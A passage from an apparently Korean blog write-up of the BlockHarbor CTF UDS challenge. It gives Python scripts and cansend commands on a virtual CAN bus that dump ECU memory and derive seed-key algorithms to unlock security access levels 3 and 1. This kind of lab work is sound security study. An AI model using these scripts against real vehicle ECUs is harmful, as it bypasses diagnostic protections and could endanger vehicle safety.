data[:dlc]recvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    p.settimeout(<span class="hljs-number">0.5</span>)    <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xC3F83000</span>, <span class="hljs-number">0xC3F865ff</span>, <span class="hljs-number">0xFF</span>):        req_data = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + addr.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7DF</span>, req_data))        <span class="hljs-keyword">try</span>:            resp_frame = p.recv(<span class="hljs-number">16</span>)            resp_id, resp_data = dissect_can_frame(resp_frame)            <span class="hljs-keyword">if</span> resp_data:                recvdata += resp_data.hex()[<span class="hljs-number">6</span>:]        <span class="hljs-keyword">except</span> socket.timeout:            <span class="hljs-keyword">continue</span>        flow_control_data = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7E0</span>, flow_control_data))        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">36</span>):            <span class="hljs-keyword">try</span>:                resp_frame = p.recv(<span class="hljs-number">16</span>)                _, resp_data = dissect_can_frame(resp_frame)                tempdata = resp_data.hex()[<span class="hljs-number">2</span>:]                <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                    recvdata += tempdata            <span class="hljs-keyword">except</span> socket.timeout:                <span class="hljs-keyword">break</span>    hex_data_string = recvdata    <span class="hljs-keyword">try</span>:        byte_data = bytes.fromhex(hex_data_string)        ascii_string = byte_data.decode(<span class="hljs-string">&quot;ascii&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>)        print(ascii_string)            <span class="hljs-keyword">except</span> ValueError:        print(<span class="hljs-string">&quot;error&quot;</span>)</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; 0xC3F83000 &#xB300;&#xC5ED;&#xC758; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC744; &#xD30C;&#xC2F1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CAN &#xD1B5;&#xC2E0;&#xC5D0;&#xC11C;&#xB294; python&#xC758; <code>can</code> &#xBAA8;&#xB4C8;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC77C;&#xBC18;&#xC801;&#xC774;&#xC9C0;&#xB9CC;, &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; <code>can</code> &#xBAA8;&#xB4C8;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xADF8;&#xB807;&#xAC8C; &#xB54C;&#xBB38;&#xC5D0; <code>socket</code> &#xBAA8;&#xB4C8;&#xB85C; &#xB300;&#xCCB4;&#xD558;&#xC5EC; &#xC791;&#xC131;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>python <code>socket</code> &#xBAA8;&#xB4C8;&#xB85C; CAN &#xD3EC;&#xB9F7;&#xC744; &#xD45C;&#xD604;&#xD560; &#xB54C;&#xB294; <code>=IB3x8s</code>&#xB97C; &#xC778;&#xC790;&#xB85C; &#xC8FC;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image20.png" alt="image20.png"></p><p>&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; flag&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-5-Security-Access-Level-3"><a href="#3-5-Security-Access-Level-3" class="headerlink" title="3.5. Security Access Level 3"></a>3.5. Security Access Level 3</h3><p><img src="image21.png" alt="image21.png"></p><p>&#xC774;&#xBC88; &#xBB38;&#xC81C;&#xB294; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 3&#xC5D0; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC54C;&#xC544;&#xB0B4;&#xC5B4;&#xC11C;, 0x1337&#xC774;&#xB77C;&#xB294; seed &#xAC12;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; key &#xAC12;&#xC744; &#xCC3E;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; &#xC774;&#xBC88; &#xB808;&#xBCA8; 3&#xC5D0;&#xC11C;&#xB294; seed &#xAC12;&#xACFC; key &#xAC12;&#xC758; &#xAE38;&#xC774;&#xB294; 2 byte &#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image22.png" alt="[image22.png](https://blog.naver.com/suresofttech/223327497814)"></p><p>&#xBA3C;&#xC800;, UDS&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4;&#xB294; ECU&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xC785;&#xB2C8;&#xB2E4;. &#xB808;&#xBCA8;&#xC740; &#xC22B;&#xC790;&#xAC00; &#xB192;&#xC744; &#xC218;&#xB85D; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC758; &#xB808;&#xBCA8;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; &#xC9C4;&#xB2E8;(<code>10</code>) &#xD655;&#xC7A5; &#xC138;&#xC158;(<code>03</code>)&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD55C; &#xC774;&#xD6C4;&#xC5D0;, SID <code>27</code>&#xB85C; &#xC0AC;&#xC6A9;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p>seed &#xAC12;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xB0B4;&#xBD80; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; key&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9;&#xD558;&#xB294; key &#xAC12;&#xC5D0; &#xC778;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC561;&#xC138;&#xC2A4;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD1B5;&#xC2E0;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C;, key &#xAC12;&#xC744; &#xBCF4;&#xB0BC; &#xB54C;&#xB9CC; &#xC811;&#xADFC;&#xD558;&#xB824;&#xB294; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; &#xAC12;&#xC5D0; +1&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xC694;&#xCCAD;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image23.png" alt="image23.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(PCI:len) 27(SID:SecurityAccess) 03(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022703</span><span class="hljs-comment"># 04(PCI:len) 27(SID:SecurityAccess) 04(Level+1) KEYS</span>cansend vcan0 7E0<span class="hljs-comment">#042704KEYS</span></code></pre><p>&#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xC778;&#xC99D; &#xC2DC;&#xD000;&#xC2A4;&#xC5D0; &#xB530;&#xB77C;&#xC11C; &#xB808;&#xBCA8; 3&#xC5D0; &#xB300;&#xD55C; &#xC778;&#xC99D;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC6B0;&#xC120; &#xC9C4;&#xB2E8; &#xD655;&#xC7A5; &#xC138;&#xC158;(<code>1030</code>)&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD55C; &#xC774;&#xD6C4;, &#xBCF4;&#xC548; &#xC5D1;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 3(<code>2703</code>) &#xC694;&#xCCAD;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; <code>7E53</code>&#xC774;&#xB77C;&#xB294; seed &#xAC12;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; key &#xAC12;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; RSID(<code>67</code>)&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74;&#xC11C;, &#xBCF4;&#xC548; &#xC5D1;&#xC138;&#xC2A4;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; seed &#xAC12;&#xC744; &#xBE44;&#xD2B8; &#xBC18;&#xC804;&#xD558;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; flag&#xB294; <code>0x1337 ^ 0xFFFF</code>&#xB97C; &#xD55C; &#xACB0;&#xACFC;&#xB85C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"> <span class="hljs-comment"># security access level 3 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x03\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    seed = msg_data.hex()[<span class="hljs-number">6</span>:<span class="hljs-number">10</span>]    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed}</span>&quot;</span>)        key = <span class="hljs-string">f&quot;<span class="hljs-subst">{~int(seed, <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>:<span class="hljs-number">04</span>X}</span>&quot;</span>    print(<span class="hljs-string">f&quot;Keys: <span class="hljs-subst">{key}</span>&quot;</span>)        key_bytes = int(key, <span class="hljs-number">16</span>).to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x04\x27\x04&quot;</span> + key_bytes + <span class="hljs-string">b&quot;\x00\x00\x00&quot;</span>    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>        print(<span class="hljs-string">&quot;Security access level 3 unlock!&quot;</span>)</code></pre><p><img src="image24.png" alt="image24.png"></p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; seed &#xAC12; &#xD655;&#xC778; &#xC774;&#xD6C4;&#xC5D0; &#xB9E4;&#xC6B0; &#xC9E7;&#xC740; &#xC2DC;&#xAC04;&#xC5D0; &#xC5F0;&#xC0B0;&#xD55C; key &#xAC12;&#xC744; &#xC804;&#xC1A1;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC704;&#xCC98;&#xB7FC; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAD8C;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;(&#xBB3C;&#xB860; &#xC190;&#xC774; &#xBE60;&#xB974;&#xB2E4;&#xBA74; &#xC9C1;&#xC811; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;).</p><h3 id="3-6-Security-Access-Level-1"><a href="#3-6-Security-Access-Level-1" class="headerlink" title="3.6. Security Access Level 1"></a>3.6. Security Access Level 1</h3><p><img src="image25.png" alt="image25.png"></p><p>&#xC774;&#xBC88; &#xBB38;&#xC81C;&#xB294; <code>0x1A000</code> &#xB300;&#xC5ED; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30;&#xB97C; &#xD1B5;&#xD574; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1 &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC54C;&#xC544;&#xB0B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. flag&#xB294; 0x7D0E1A5C&#xAC00; seed&#xC77C; &#xB54C;&#xC758; key &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xB808;&#xBCA8; 1&#xC758; seed &#xAC12;&#xACFC; key &#xAC12;&#xC758; &#xAE38;&#xC774;&#xB294; 4 byte&#xC778; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD76C;&#xD55C;&#xD558;&#xAC8C; UDS Challenge&#xC5D0;&#xC11C;&#xB294; &#xB808;&#xBCA8; 1&#xC774; &#xB808;&#xBCA8; 3&#xBCF4;&#xB2E4; &#xB4A4;&#xC5D0; &#xBC30;&#xCE58;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># read memory</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, dlc, datarecvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    can_id_filter = <span class="hljs-number">0x7E8</span>    can_mask_filter = <span class="hljs-number">0xFFF</span>    can_filter = struct.pack(<span class="hljs-string">&quot;=II&quot;</span>, can_id_filter, can_mask_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, can_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_RECV_OWN_MSGS, <span class="hljs-number">0</span>)    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    <span class="hljs-keyword">for</span> hex_value <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x1A000</span>, <span class="hljs-number">0x1B000</span>, <span class="hljs-number">0xFF</span>):        candata = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + hex_value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>                data1 = <span class="hljs-string">b&quot;\x02\x10\x02\x00\x00\x00\x00\x00&quot;</span>        frame1 = build_can_frame(<span class="hljs-number">0x7DF</span>, data1)        p.send(frame1)                frame_r1 = p.recv(<span class="hljs-number">16</span>)                frame2 = build_can_frame(<span class="hljs-number">0x7DF</span>, candata)        p.send(frame2)                frame_r2 = p.recv(<span class="hljs-number">16</span>)        can_id2, dlc2, data_r2 = dissect_can_frame(frame_r2)                recvdata += data_r2.hex()[<span class="hljs-number">6</span>:]                data3 = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)        p.send(frame3)                temp = <span class="hljs-number">0</span>        <span class="hljs-keyword">while</span> temp &lt; <span class="hljs-number">36</span>:            frame_r_loop = p.recv(<span class="hljs-number">16</span>)            can_id_loop, dlc_loop, data_loop = dissect_can_frame(frame_r_loop)                        tempdata = data_loop.hex()[<span class="hljs-number">2</span>:]                        <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                recvdata += tempdata            temp = temp + <span class="hljs-number">1</span>print(<span class="hljs-string">f&quot;recv data: <span class="hljs-subst">{recvdata}</span>&quot;</span>)</code></pre><p>&#xBA3C;&#xC800;, <code>0x1A000</code> &#xB300;&#xC5ED; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30;&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="image26.png" alt="image26.png"></p><p>&#xC774;&#xC804;&#xC5D0; &#xB808;&#xBCA8; 3&#xB97C; &#xC778;&#xC99D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xBA3C;&#xC800; &#xC2E4;&#xD589;&#xD574;&#xC11C; &#xB808;&#xBCA8; 3 &#xC778;&#xC99D;&#xC744; &#xD1B5;&#xACFC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8; &#xC774;&#xD6C4;&#xC5D0; &#xBC29;&#xAE08; &#xC791;&#xC131;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;, 4 byte &#xAC12;&#xC774; 2&#xBC88; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAC12;&#xC740; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1 &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; seed &#xAC12;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xB2EC;&#xB77C;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x983cb51b</span> ^ <span class="hljs-number">0xcd051f0c</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0xddee9870</span> ^ <span class="hljs-number">0x88d73267</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x4a4499ad</span> ^ <span class="hljs-number">0x1f7d33ba</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span></code></pre><p>&#xD574;&#xB2F9; &#xAC12;&#xB4E4;&#xC744; XOR &#xC5F0;&#xC0B0;&#xC744; &#xD558;&#xBA74; <code>0x5539aa17</code>&#xC774;&#xB77C;&#xB294; &#xACE0;&#xC815;&#xC801;&#xC778; &#xAC12;&#xC774; &#xB098;&#xC624;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; seed &#xAC12;&#xACFC; &#xC5F0;&#xC0B0;&#xD55C; key &#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC5F0;&#xC0B0; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; <code>seed ^ 0x5539aa17</code>&#xC774;&#xB77C;&#xB294; &#xAC83; &#xC5ED;&#xC2DC; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image28.png" alt="image27.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(PCI:len) 27(SID:SecurityAccess) 01(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022701</span><span class="hljs-comment"># 06(PCI:len) 27(SID:SecurityAccess) 02(Level+1) KEYSKEYS</span>cansend vcan0 7E0<span class="hljs-comment">#062702KEYSKEYS</span></code></pre><p>&#xC54C;&#xC544;&#xB0B8; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1 &#xC778;&#xC99D;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;, RSID(<code>67</code>)&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA70; &#xC131;&#xACF5;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># security access level 1 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x01\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    seed_bytes = msg_data[<span class="hljs-number">3</span>:<span class="hljs-number">7</span>]    seed_int = int.from_bytes(seed_bytes, <span class="hljs-string">&apos;big&apos;</span>)    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_int = seed_int ^ <span class="hljs-number">0x5539AA17</span>    print(<span class="hljs-string">f&quot;Key: <span class="hljs-subst">{key_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_bytes = key_int.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x06\x27\x02&quot;</span> + key_bytes    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    print(<span class="hljs-string">&quot;Security access level 1 unlock!&quot;</span>)</code></pre><p><img src="image28.png" alt="image28.png"></p><p>&#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1&#xC744; &#xD574;&#xC81C;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB3C4; &#xC5ED;&#xC2DC; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image29.jpg" alt="image29.jpg"></p><h2 id="4-UDS-&#xBA85;&#xB839;&#xC5B4;&#xB85C;-&#xBC1C;&#xC0DD;&#xD558;&#xB294;-CVE"><a href="#4-UDS-&#xBA85;&#xB839;&#xC5B4;&#xB85C;-&#xBC1C;&#xC0DD;&#xD558;&#xB294;-CVE" class="headerlink" title="4. UDS &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; CVE"></a>4. UDS &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; CVE</h2><p><img src="image30.jpg" alt="image30.jpg"></p><p>BlockHarbor CTF&#xB85C; &#xBC30;&#xC6B4; UDS &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xACE0;, 